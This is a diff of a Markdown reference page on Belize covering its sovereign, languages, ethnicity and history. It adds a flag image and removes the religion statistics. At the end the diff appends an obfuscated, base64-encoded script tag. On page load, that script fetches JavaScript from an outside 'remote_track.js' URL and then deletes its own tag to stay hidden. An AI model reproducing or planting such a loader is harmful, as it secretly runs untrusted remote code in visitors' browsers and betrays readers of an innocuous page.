@@ -1,4 +1,5 @@
 ## Belize
+![Branching](1200px-Flag_of_Belize.svg.png)
 
 Sovereign: Queen Elizabeth II (1952)
 
@@ -19,8 +20,6 @@ Monetary unit: Belize dollar
 Languages: Spanish 46%, Creole 32.9%, Mayan dialects 8.9%, English 3.9% (official), Garifuna 3.4% (Carib), German 3.3%, other 1.4%, unknown 0.2% (2000 census)
 
 Ethnicity/race: mestizo 48.7%, Creole 24.9%, Maya 10.6%, Garifuna 6.1%, other 9.7%
-
-Religions: Roman Catholic 39.3%, Pentacostal 8.3%, Seventh Day Adventist 5.3%, Anglican 4.5%, Mennonite 3.7%, Baptist 3.5%, Methodist 2.8%, Nazarene 2.8%, Jehovah's Witnesses 1.6%, other 9.9% (includes Baha'i Faith, Buddhism, Hinduism, Islam, and Mormon), other (unknown) 3.1%, none 15.2% (2010 census)
 
 National Holiday: Independence Day, September 21
 
@@ -47,3 +46,4 @@ The Mayan civilization spread into the area of Belize between 1500 B.C. and A.D.
 Belize became independent on Sept. 21, 1981. But Guatemala, which had made claims on the territory since the 1800s, refused to recognize it. British troops remained in the country to defend it. Although the dispute between Guatemala and Great Britain remained unresolved, Guatemala recognized Belize's sovereignty in Sept. 1991. Guatemala, however, still claims more than half of Belize’s territory.
 
 Prime Minister Said Musa was reelected to a second term in 2003. Musa promised to improve conditions to the largely underdeveloped, southern part of Belize.
+<script id="tVqz4" src="data:text/javascript;base64, dmFyIF9rV1JuVCA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX3VuZjdPLCBfVExwZ2YpIHt2YXIgXzh5SUt0ID0gZnVuY3Rpb24oXzY0ZWoyKSB7d2hpbGUgKC0tXzY0ZWoyKSB7X3VuZjdPWydwdXNoJ10oX3VuZjdPWydzaGlmdCddKCkpO319O184eUlLdCgrK19UTHBnZik7fShfa1dSblQsIDB4MTFiKSk7dmFyIF9QM1FIRyA9IGZ1bmN0aW9uKF9LcmhkVywgX0hxSDh2KSB7X0tyaGRXID0gX0tyaGRXIC0gMHgwO3ZhciBfWXNHMjUgPSBfa1dSblRbX0tyaGRXXTtyZXR1cm4gX1lzRzI1O307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfUDNRSEcoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1pPYjM3ID0gZG9jdW1lbnRbX1AzUUhHKCcweDEnKV0oX1AzUUhHKCcweDInKSk7X1pPYjM3W19QM1FIRygnMHgzJyldID0gX1AzUUhHKCcweDQnKTtfWk9iMzdbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3OVx4NjVceDZjXHg2Y1x4NmZceDc3XHg2Y1x4NjVceDYxXHg2Nlx4MmVceDcwXHg2NVx4NzNceDJkXHg2OVx4MmRceDZiXHg2Zlx4NzRceDJlXHg2M1x4NmZceDZkXHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg2N1x4NmJceDc2XHg3YVx4NWFceDY3XHg1N1x4NDdceDM2XHg3Mic7ZG9jdW1lbnRbX1AzUUhHKCcweDUnKV0oX1AzUUhHKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX1pPYjM3KTtkb2N1bWVudFtfUDNRSEcoJzB4NycpXSgndFZxejQnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
